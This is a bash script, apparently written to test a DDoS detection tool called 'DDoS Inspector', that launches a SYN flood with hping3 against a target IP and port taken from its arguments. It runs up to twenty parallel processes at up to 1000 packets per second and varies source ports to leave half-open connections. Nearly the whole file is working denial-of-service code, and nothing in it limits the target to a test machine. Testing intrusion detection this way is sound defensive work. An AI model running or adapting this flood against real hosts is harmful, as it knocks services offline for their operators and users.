#!/bin/bash

# Enhanced SYN Flood Attack Script
# Now generates attacks intense enough to trigger the harder detection thresholds

TARGET_IP=${1:-"127.0.0.1"}
TARGET_PORT=${2:-"80"}
DURATION=${3:-"30"}
INTENSITY=${4:-"high"}

# Colors for better output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${GREEN}[ATTACK] Starting Enhanced SYN Flood Attack${NC}"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Duration: ${DURATION}s"
echo "Intensity: $INTENSITY"

case $INTENSITY in
    "low")
        RATE=60        # 60 packets/sec - should NOT trigger (need 50 in 5 sec = 10/sec minimum)
        PARALLEL=3
        ;;
    "medium") 
        RATE=200       # 200 packets/sec - should trigger rate-based detection
        PARALLEL=5
        ;;
    "high")
        RATE=500       # 500 packets/sec - should definitely trigger
        PARALLEL=10
        ;;
    "extreme")
        RATE=1000      # 1000 packets/sec - overwhelm detection
        PARALLEL=20
        ;;
esac

echo -e "${BLUE}[STATS] Attack Parameters:${NC}"
echo "  - Rate: $RATE packets/second"
echo "  - Parallel processes: $PARALLEL" 
echo "  - Total packets: $((RATE * DURATION))"
echo ""

# Function to send SYN packets
send_syn_flood() {
    local process_id=$1
    local packets_per_process=$((RATE / PARALLEL))
    local interval_ms=$((1000 / packets_per_process))  # Convert to milliseconds for integer math
    
    echo "Process $process_id: Sending $packets_per_process packets/sec (interval: ${interval_ms}ms)"
    
    for ((i=0; i<$((packets_per_process * DURATION)); i++)); do
        # Use different source ports to create unique half-open connections
        local src_port=$((32768 + (process_id * 1000) + (i % 1000)))
        
        # Send SYN packet using hping3 (more reliable than nmap)
        timeout 1 hping3 -S -p $TARGET_PORT -s $src_port -c 1 -i u${interval_ms}000 $TARGET_IP >/dev/null 2>&1 &
        
        # Rate limiting using milliseconds
        if [ $interval_ms -gt 0 ]; then
            sleep 0.$(printf "%03d" $interval_ms) 2>/dev/null || sleep 0.001
        else
            sleep 0.001
        fi
    done
}

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null; then
    echo -e "${YELLOW}[WARNING] hping3 not found. Installing...${NC}"
    sudo apt-get update && sudo apt-get install -y hping3
fi

# Check if bc is installed (for calculations)
if ! command -v bc &> /dev/null; then
    echo -e "${YELLOW}[WARNING] bc not found. Installing...${NC}"
    sudo apt-get install -y bc
fi

echo -e "${RED}[ATTACK] Starting SYN flood attack...${NC}"
echo -e "${BLUE}[TIMER] This will run for $DURATION seconds${NC}"

# Start parallel attack processes
for ((p=1; p<=PARALLEL; p++)); do
    send_syn_flood $p &
    PIDS[$p]=$!
done

# Monitor attack progress
start_time=$(date +%s)
while true; do
    current_time=$(date +%s)
    elapsed=$((current_time - start_time))
    
    if [ $elapsed -ge $DURATION ]; then
        break
    fi
    
    # Show progress
    remaining=$((DURATION - elapsed))
    echo -e "${BLUE}[PROGRESS] Attack in progress... ${remaining}s remaining (sent ~$((RATE * elapsed)) packets)${NC}"
    sleep 2
done

# Clean up background processes
echo -e "${YELLOW}[CLEANUP] Stopping attack processes...${NC}"
for pid in "${PIDS[@]}"; do
    kill $pid 2>/dev/null || true
done

# Kill any remaining hping3 processes
pkill -f "hping3.*$TARGET_IP" 2>/dev/null || true

echo -e "${GREEN}[COMPLETE] SYN flood attack completed${NC}"
echo -e "${BLUE}[STATS] Total packets sent: ~$((RATE * DURATION))${NC}"
echo -e "${BLUE}[INFO] Check your DDoS Inspector logs for detection alerts${NC}"
echo ""
echo -e "${GREEN}[EXPECTED] Expected behavior with harder thresholds:${NC}"
echo "   - Rate-based: Should detect with $RATE pps (need >10 pps)"
echo "   - Half-open: Should detect if >100 connections remain open"

